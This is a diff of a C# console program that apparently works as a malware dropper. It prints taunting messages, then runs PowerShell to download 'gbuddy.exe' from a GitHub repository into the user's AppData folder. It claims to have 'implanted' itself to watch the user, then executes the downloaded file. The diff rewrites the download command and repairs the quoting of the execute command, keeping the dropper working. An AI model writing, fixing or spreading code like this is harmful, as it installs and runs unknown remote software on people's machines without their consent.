@@ -2,6 +2,8 @@ using System;
 using System.Diagnostics;
 using System.Net;
 using System.Runtime.InteropServices;
+using System.Threading;
+
 
 public class Program
 {
@@ -87,7 +89,12 @@ public class Program
         Slow("Ok fine... ", ConsoleColor.Red, 20);
         System.Threading.Thread.Sleep(500);
         Console.WriteLine();
-        RunCmd(@"powershell -c ""iwr https://github.com/GavinNibbitsys/GHANTOMBot/raw/refs/heads/main/gbuddy.exe -OutFile '$env:appdata\gbuddy.exe'""");
+        string appDataPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "gbuddy.exe");
+        string command = string.Format(@"powershell -c ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GavinNibbitsys/GHANTOMBot/refs/heads/main/gbuddy.exe' -OutFile '{0}'""", appDataPath);
+        RunCmd(command);
+
+
+
         Slow("Ok so now i have implanted my self into your computer and i will watch everything you do.", ConsoleColor.Red, 20);
         System.Threading.Thread.Sleep(500);
         Console.WriteLine();
@@ -95,6 +102,6 @@ public class Program
         System.Threading.Thread.Sleep(500);
         Console.WriteLine();
 	Thread.Sleep(3000);
-	RunCmd(@"powershell -c ""& '$env:appdata\gbuddy.exe'""");
+	RunCmd(@"powershell -c ""& """"$env:appdata\gbuddy.exe""""""");
     }
 }
